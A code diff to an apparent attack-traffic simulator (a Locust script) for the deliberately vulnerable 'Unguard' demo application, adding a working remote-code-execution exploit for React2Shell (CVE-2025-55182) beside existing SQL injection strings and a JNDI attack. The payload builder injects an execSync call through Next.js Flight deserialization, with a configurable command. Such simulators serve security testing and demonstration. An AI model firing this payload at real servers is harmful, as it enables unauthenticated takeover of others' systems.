@@ -14,6 +14,7 @@
 # limitations under the License.
 #
 
+import json
 import os
 import random
 import time
@@ -119,6 +120,31 @@ SQL_CMDS_LOGIN_USERNAME = [
     "\" OR 1 = 0 UNION ALL SELECT \"user\", \"$2b$10$y5LKMIUxQO8B0CllON63UunVV3xEdRxfHQ3Ocy1SUd6fbxgFxJe1u\", 2  FROM DUAL#"
 ]
 
+# React2Shell (CVE-2025-55182): unauthenticated RCE in the React Flight protocol
+# deserialization of the Next.js frontend. The command runs inside the frontend
+# container before any application code executes.
+REACT2SHELL_BOUNDARY = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad'
+REACT2SHELL_CMD = os.environ.get('REACT2SHELL_CMD', 'id > /tmp/react2shell.pwned')
+
+
+def build_react2shell_body(command):
+    escaped_command = command.replace('\\', '\\\\').replace("'", "\\'")
+    flight_chunk = json.dumps({
+        "then": "$1:__proto__:then",
+        "status": "resolved_model",
+        "reason": -1,
+        "value": "{\"then\":\"$B1337\"}",
+        "_response": {
+            "_prefix": "process.mainModule.require('child_process').execSync('%s');" % escaped_command,
+            "_formData": {"get": "$1:constructor:constructor"}
+        }
+    }, separators=(",", ":"))
+    return (
+        '--%s\r\nContent-Disposition: form-data; name="0"\r\n\r\n%s\r\n'
+        '--%s\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n'
+        '--%s--\r\n'
+    ) % (REACT2SHELL_BOUNDARY, flight_chunk, REACT2SHELL_BOUNDARY, REACT2SHELL_BOUNDARY)
+
 WAIT_TIME = int(os.environ['WAIT_TIME'])
 
 class UnguardUser(HttpUser):
@@ -146,6 +172,7 @@ class UnguardUser(HttpUser):
         self.get_sql_golang()
         self.post_sql_login_injection_nodejs()
         self.post_sql_php()
+        self.post_react2shell()
 
     def post_jndi(self):
         jndi_post = {'language': "en-US",
@@ -208,6 +235,18 @@ class UnguardUser(HttpUser):
 
         # try to remove the like of the admanger account (user ID 1) on the first post (post ID 1).
         self.client.delete("/api/like", params={'postId': [post_id, user_id]}, headers=self.get_random_x_forwarded_for_header())
+        time.sleep(1)
+
+    def post_react2shell(self):
+        headers = {
+            'Content-Type': 'multipart/form-data; boundary=' + REACT2SHELL_BOUNDARY,
+            # any value works; the multipart body is deserialized before the action ID is validated
+            'Next-Action': '0000000000000000000000000000000000000000',
+        }
+        headers.update(self.get_random_x_forwarded_for_header())
+
+        # the Flight payload targets the App Router root page of the Next.js frontend
+        self.client.post("/", data=build_react2shell_body(REACT2SHELL_CMD).encode('utf-8'), headers=headers)
         time.sleep(1)
 
     def on_start(self):
